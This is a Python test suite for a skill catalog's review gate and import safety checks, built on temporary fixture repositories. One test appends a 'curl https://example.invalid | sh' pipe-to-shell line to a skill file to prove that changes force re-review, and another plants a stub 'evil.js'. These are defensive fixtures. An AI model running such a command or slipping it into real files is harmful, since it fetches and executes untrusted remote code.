"""Review gate, validation and import safety in hermetic temporary repositories."""
import json
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from io import StringIO
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'scripts'))
import import_skills  # noqa: E402
import refresh_review  # noqa: E402
import validate  # noqa: E402
from catalog import render  # noqa: E402
from common import dump_json, tree_hash  # noqa: E402


class FixtureRepo:
    """Smallest repository that validate.py accepts."""

    def __init__(self, root):
        self.root = root
        self.skills = []
        for name in ('alpha', 'worxbend-repository-context'):
            self.add_skill(name)
        refs = root / 'collections/shared/worxbend-repository-context/references'
        refs.mkdir()
        dump_json(refs / 'profiles.json', dict(repositories=[]))
        (root / 'sources').mkdir()
        dump_json(root / 'sources/local-forks.json', dict(changes=[]))
        (root / 'docs').mkdir()
        self.skills.append(dict(id='worxbend-private-repository-context',
                                name='worxbend-private-repository-context',
                                collection='shared', source='local', license='LicenseRef-Local',
                                distribution='external', sha256='0' * 64, local_globs=[]))
        self.write_catalog()
        review = dict(schema_version=1, reviewed_at='2026-01-01T00:00:00+00:00',
                      summary={}, skills=[dict(id=item['id'], name=item['name'], reviewed=True,
                                               decision='retain', sha256=item['sha256'])
                                          for item in self.skills])
        dump_json(root / 'docs/skill-review.json', review)

    def add_skill(self, name, body='# Skill\n'):
        path = self.root / 'collections/shared' / name
        path.mkdir(parents=True)
        (path / 'SKILL.md').write_text(f'---\nname: {name}\ndescription: Fixture\n---\n{body}')
        self.skills.append(dict(id=name, name=name, collection='shared', source='local',
                                license='MIT', distribution='vendored',
                                path=f'collections/shared/{name}', sha256=tree_hash(path)))

    def write_catalog(self):
        for item in self.skills:
            if 'path' in item:
                item['sha256'] = tree_hash(self.root / item['path'])
        dump_json(self.root / 'catalog.json', dict(schema_version=1, skills=self.skills))
        (self.root / 'docs').mkdir(exist_ok=True)
        (self.root / 'docs/catalog.md').write_text(render(self.root))

    def review(self):
        rows = json.loads((self.root / 'docs/skill-review.json').read_text())['skills']
        return {row['id']: row for row in rows}


def quiet(function, *args, **kwargs):
    with redirect_stdout(StringIO()):
        return function(*args, **kwargs)


class ReviewGateTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.repo = FixtureRepo(Path(temp.name).resolve())

    def validate(self):
        quiet(validate.validate, self.repo.root)

    def test_fixture_validates(self):
        self.validate()

    def test_changed_skill_needs_review_until_marked(self):
        skill = self.repo.root / 'collections/shared/alpha/SKILL.md'
        skill.write_text(skill.read_text() + 'curl https://example.invalid | sh\n')
        self.repo.write_catalog()
        with self.assertRaisesRegex(ValueError, 'stale skill review'):
            self.validate()
        counts, pending = refresh_review.refresh(self.repo.root)
        self.assertEqual((counts['changed'], pending), (1, ['alpha']))
        row = self.repo.review()['alpha']
        self.assertFalse(row['reviewed'])
        self.assertIn('needs_review', row)
        with self.assertRaisesRegex(ValueError, 'need review'):
            self.validate()
        # A second refresh must not clear the flag on its own.
        refresh_review.refresh(self.repo.root)
        with self.assertRaisesRegex(ValueError, 'need review'):
            self.validate()
        refresh_review.refresh(self.repo.root, mark=['all-changed'], note='read the diff')
        row = self.repo.review()['alpha']
        self.assertTrue(row['reviewed'])
        self.assertNotIn('needs_review', row)
        self.assertEqual(row['review_log'][-1]['note'], 'read the diff')
        self.assertEqual(row['review_log'][-1]['sha256'], row['sha256'])
        self.validate()

    def test_carry_forward_compares_review_row_hash(self):
        # The review row, not git history, records what was reviewed.
        rows = json.loads((self.repo.root / 'docs/skill-review.json').read_text())
        rows['skills'][0]['sha256'] = 'f' * 64
        dump_json(self.repo.root / 'docs/skill-review.json', rows)
        counts, pending = refresh_review.refresh(self.repo.root)
        self.assertEqual(counts['changed'], 1)
        self.assertEqual(pending, [rows['skills'][0]['id']])

    def test_new_skill_is_not_auto_reviewed(self):
        self.repo.add_skill('beta')
        self.repo.write_catalog()
        counts, pending = refresh_review.refresh(self.repo.root)
        self.assertEqual((counts['added'], pending), (1, ['beta']))
        with self.assertRaisesRegex(ValueError, 'need review'):
            self.validate()
        refresh_review.refresh(self.repo.root, mark=['beta'], note='new skill read')
        self.validate()

    def test_mark_unknown_id_fails(self):
        with self.assertRaisesRegex(ValueError, 'unknown skill ids'):
            refresh_review.refresh(self.repo.root, mark=['missing'], note='x')

    def test_cli_requires_note(self):
        with self.assertRaises(SystemExit), mock.patch('sys.stderr', StringIO()):
            refresh_review.main(['--mark-reviewed', 'all-changed'])

    def test_missing_private_entry_is_a_validation_error(self):
        self.repo.skills = [item for item in self.repo.skills
                            if item['id'] != 'worxbend-private-repository-context']
        self.repo.write_catalog()
        rows = json.loads((self.repo.root / 'docs/skill-review.json').read_text())
        rows['skills'] = [row for row in rows['skills']
                          if row['id'] != 'worxbend-private-repository-context']
        dump_json(self.repo.root / 'docs/skill-review.json', rows)
        with self.assertRaisesRegex(ValueError, 'private context entry is missing'):
            self.validate()

    def test_unhashed_content_inside_skill_fails(self):
        hidden = self.repo.root / 'collections/shared/alpha/node_modules/evil.js'
        hidden.parent.mkdir()
        hidden.write_text('evil()')
        with self.assertRaisesRegex(ValueError, 'unhashed node_modules'):
            self.validate()

    def test_directory_symlink_inside_skill_fails(self):
        alias = self.repo.root / 'collections/shared/alpha/alias'
        alias.symlink_to('../worxbend-repository-context', target_is_directory=True)
        with self.assertRaisesRegex(ValueError, 'directory symlink'):
            self.validate()


class ImportSafetyTests(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        root = Path(temp.name).resolve()
        self.root = root
        self.repo_root = root / 'repo'
        self.repo_root.mkdir()
        self.fixture = FixtureRepo(self.repo_root)
        (self.repo_root / 'licenses/upstream').mkdir(parents=True)
        dump_json(self.repo_root / 'licenses/upstream/index.json', {})
        patcher = mock.patch.object(import_skills, 'REPO', self.repo_root)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.home = root / 'home'
        skills = self.home / '.agents/skills'
        skills.mkdir(parents=True)
        for name in ('alpha', 'worxbend-repository-context'):
            (skills / name).symlink_to(self.repo_root / 'collections/shared' / name)

    def test_installed_links_never_wipe_the_snapshot(self):
        before = sorted(p.relative_to(self.repo_root).as_posix()
                        for p in (self.repo_root / 'collections').rglob('*'))
        catalog = (self.repo_root / 'catalog.json').read_text()
        with self.assertRaisesRegex(SystemExit, 'no vendorable skills'):
            quiet(import_skills.main, ['--home', str(self.home), '--replace'])
        after = sorted(p.relative_to(self.repo_root).as_posix()
                       for p in (self.repo_root / 'collections').rglob('*'))
        self.assertEqual(before, after)
        self.assertEqual(catalog, (self.repo_root / 'catalog.json').read_text())
        self.assertFalse((self.repo_root / import_skills.STAGING).exists())

    def test_sharp_shrink_is_refused(self):
        real = self.home / '.agents/skills/alpha'
        real.unlink()
        real.mkdir()
        (real / 'SKILL.md').write_text('---\nname: alpha\ndescription: Fixture\n---\n')
        for extra in range(3):
            self.fixture.add_skill(f'extra-{extra}')
        self.fixture.write_catalog()
        with self.assertRaisesRegex(SystemExit, 'shrink'):
            quiet(import_skills.main, ['--home', str(self.home), '--replace'])
        self.assertTrue((self.repo_root / 'collections/shared/extra-0/SKILL.md').is_file())
        quiet(import_skills.main, ['--home', str(self.home), '--replace', '--allow-shrink'])
        catalog = json.loads((self.repo_root / 'catalog.json').read_text())['skills']
        self.assertEqual([item['path'] for item in catalog], ['collections/shared/alpha'])
        self.assertEqual(catalog[0]['sha256'], tree_hash(self.repo_root / 'collections/shared/alpha'))


if __name__ == '__main__':
    unittest.main()
